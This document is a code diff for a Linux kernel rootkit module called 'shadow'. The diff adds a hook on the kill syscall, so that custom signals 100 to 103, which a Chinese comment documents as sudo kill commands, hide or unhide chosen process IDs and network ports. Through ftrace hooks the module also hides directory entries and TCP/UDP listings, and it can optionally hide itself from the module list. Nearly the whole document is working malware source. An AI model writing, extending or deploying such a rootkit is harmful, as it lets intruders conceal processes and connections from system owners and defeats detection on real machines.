@@ -9,22 +9,99 @@
 #include <linux/inet_diag.h>
 #include <linux/seq_file.h>
 #include <linux/ctype.h>
+#include <linux/signal.h>
 #include <net/tcp.h>
 #include <net/udp.h>
 #include "shadow.h"
 
 #define MAX_HIDDEN_PIDS 16
 #define MAX_HIDDEN_PORTS 16
+#define PID_LEN 16
 
-static char *hide_pids[MAX_HIDDEN_PIDS];
+/* 
+隐藏进程：sudo kill -101 <PID>
+取消隐藏进程：sudo kill -100 <PID>
+隐藏端口：sudo kill -102 <PORT>
+取消隐藏端口：sudo kill -103 <PORT>
+ */
+#define SIG_UNHIDE_PID 100
+#define SIG_HIDE_PID 101
+#define SIG_HIDE_PORT 102
+#define SIG_UNHIDE_PORT 103
+
+static char hide_pids[MAX_HIDDEN_PIDS][PID_LEN];
 static int hide_pids_count = 0;
 static u16 hide_ports[MAX_HIDDEN_PORTS];
 static int hide_ports_count = 0;
-static int self_hide = 0; /* Default: don't hide the module itself for easier debugging */
+static int self_hide = 0;
 
-module_param_array(hide_pids, charp, &hide_pids_count, 0644);
-module_param_array(hide_ports, ushort, &hide_ports_count, 0644);
 module_param(self_hide, int, 0644);
+
+/* --- Signal Hijacking Logic --- */
+
+static int (*real_kill)(pid_t pid, int sig);
+
+static int fake_kill(pid_t pid, int sig)
+{
+    int i, j;
+    char pid_str[PID_LEN];
+
+    switch (sig) {
+        case SIG_HIDE_PID:
+            if (hide_pids_count >= MAX_HIDDEN_PIDS) return -ENOSPC;
+            snprintf(pid_str, PID_LEN, "%d", pid);
+            /* Check if already hidden */
+            for (i = 0; i < hide_pids_count; i++) {
+                if (strcmp(hide_pids[i], pid_str) == 0) return 0;
+            }
+            strncpy(hide_pids[hide_pids_count], pid_str, PID_LEN);
+            hide_pids_count++;
+            pr_info("shadow: Hidden PID %d\n", pid);
+            return 0;
+
+        case SIG_UNHIDE_PID:
+            snprintf(pid_str, PID_LEN, "%d", pid);
+            for (i = 0; i < hide_pids_count; i++) {
+                if (strcmp(hide_pids[i], pid_str) == 0) {
+                    /* Shift remaining elements */
+                    for (j = i; j < hide_pids_count - 1; j++) {
+                        strncpy(hide_pids[j], hide_pids[j+1], PID_LEN);
+                    }
+                    hide_pids_count--;
+                    pr_info("shadow: Unhidden PID %d\n", pid);
+                    return 0;
+                }
+            }
+            return 0;
+
+        case SIG_HIDE_PORT:
+            if (hide_ports_count >= MAX_HIDDEN_PORTS) return -ENOSPC;
+            /* Check if already hidden */
+            for (i = 0; i < hide_ports_count; i++) {
+                if (hide_ports[i] == (u16)pid) return 0;
+            }
+            hide_ports[hide_ports_count] = (u16)pid;
+            hide_ports_count++;
+            pr_info("shadow: Hidden port %d\n", pid);
+            return 0;
+
+        case SIG_UNHIDE_PORT:
+            for (i = 0; i < hide_ports_count; i++) {
+                if (hide_ports[i] == (u16)pid) {
+                    /* Shift remaining elements */
+                    for (j = i; j < hide_ports_count - 1; j++) {
+                        hide_ports[j] = hide_ports[j+1];
+                    }
+                    hide_ports_count--;
+                    pr_info("shadow: Unhidden port %d\n", pid);
+                    return 0;
+                }
+            }
+            return 0;
+    }
+
+    return real_kill(pid, sig);
+}
 
 /* --- Process Hiding Logic --- */
 
@@ -161,74 +238,58 @@ static void show_module(void)
 
 /* --- Module Setup --- */
 
-static struct ftrace_hook process_hooks[] = {
+static struct ftrace_hook hooks[] = {
     { .name = "iterate_shared", .function = fake_iterate_shared, .original = &real_iterate_shared },
     { .name = "iterate_dir", .function = fake_iterate_dir, .original = &real_iterate_dir },
-};
-
-static struct ftrace_hook network_hooks[] = {
     { .name = "tcp4_seq_show", .function = fake_tcp4_seq_show, .original = &real_tcp4_seq_show },
     { .name = "udp4_seq_show", .function = fake_udp4_seq_show, .original = &real_udp4_seq_show },
+    { .name = "__x64_sys_kill", .function = fake_kill, .original = &real_kill },
 };
 
-static int __init stealth_init(void)
+static struct ftrace_hook arm_hooks[] = {
+    { .name = "__arm64_sys_kill", .function = fake_kill, .original = &real_kill },
+};
+
+static int __init shadow_init(void)
 {
     int err;
-    int i;
-    int process_hook_count = 0;
 
     err = resolve_ftrace_functions();
     if (err) return err;
 
-    for (i = 0; i < ARRAY_SIZE(process_hooks); i++) {
-        err = fh_install_hook(&process_hooks[i]);
-        if (err == 0) {
-            process_hook_count++;
-        } else {
-            pr_warn("Failed to install hook for %s, skipping...\n", process_hooks[i].name);
-        }
-    }
-
-    if (process_hook_count == 0) {
-        pr_err("Failed to install any process hiding hooks. Aborting.\n");
-        return -ENOENT;
-    }
-
-    err = fh_install_hooks(network_hooks, ARRAY_SIZE(network_hooks));
+    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if (err) {
-        pr_warn("Failed to install network hooks, network hiding will be disabled.\n");
+        err = fh_install_hooks(arm_hooks, ARRAY_SIZE(arm_hooks));
+        if (err) {
+            pr_err("shadow: Failed to install hooks\n");
+            return err;
+        }
     }
     
     if (self_hide) {
         hide_module();
-        pr_info("Stealth module loaded in HIDDEN mode.\n");
+        pr_info("shadow: Loaded in HIDDEN mode.\n");
     } else {
-        pr_info("Stealth module loaded in VISIBLE mode.\n");
+        pr_info("shadow: Loaded in VISIBLE mode.\n");
     }
     
-    pr_info("Hiding %d PIDs and %d ports\n", hide_pids_count, hide_ports_count);
     return 0;
 }
 
-static void __exit stealth_exit(void)
+static void __exit shadow_exit(void)
 {
-    int i;
     if (self_hide) {
         show_module();
     }
 
-    for (i = 0; i < ARRAY_SIZE(process_hooks); i++) {
-        if (process_hooks[i].address)
-            fh_remove_hook(&process_hooks[i]);
-    }
-
-    fh_remove_hooks(network_hooks, ARRAY_SIZE(network_hooks));
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    fh_remove_hooks(arm_hooks, ARRAY_SIZE(arm_hooks));
     
-    pr_info("Stealth module unloaded\n");
+    pr_info("shadow: Unloaded\n");
 }
 
-module_init(stealth_init);
-module_exit(stealth_exit);
+module_init(shadow_init);
+module_exit(shadow_exit);
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("test");
-MODULE_DESCRIPTION("LKM for hiding processes and network connections on Linux 5.15/6.8");
+MODULE_DESCRIPTION("LKM shadow for hiding processes and network connections via signal hijacking");
